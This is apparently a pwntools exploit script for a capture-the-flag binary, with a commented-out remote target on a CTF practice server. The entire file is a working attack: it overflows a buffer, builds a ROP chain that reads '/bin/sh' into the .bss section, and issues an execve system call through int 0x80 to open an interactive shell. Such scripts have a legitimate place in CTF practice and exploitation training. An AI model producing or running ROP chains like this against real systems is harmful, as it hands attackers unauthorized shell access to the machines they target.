from pwn import *
context.log_level='debug'
io = process('./pwn')
# io = remote('node4.buuoj.cn', 25928)
int80 = 0x806C943
popeax_ret = 0x80B8016
popebx_edx_ret = 0x806ECD9
popecx_ret = 0x80DE769
addesp0x14_ret = 0x807A75D
bss = 0x80EBFD4
read = 0x806D290
payload = cyclic(12 + 4)

payload += p32(read)			# call read()
payload += p32(addesp0x14_ret)	# return address, add esp to execute latter ROP
payload += p32(0)				# arg #1 of read(): stdin
payload += p32(bss)				# arg #2 of read(): a bss address
payload += p32(0x8)				# arg #3 of read(): read length
payload += p32(0) * 2

payload += p32(popeax_ret)		# eax = 0x11(SYS_EXECVE)
payload += p32(11)
payload += p32(popebx_edx_ret)
payload += p32(bss)				# ebx = '/bin/sh'
payload += p32(0)				# edx = 0
payload += p32(popecx_ret)
payload += p32(0)				# ecx = 0
payload += p32(int80)			# int 80
io.sendline(payload)
io.sendline(b'/bin/sh' + b'\x00')
io.interactive()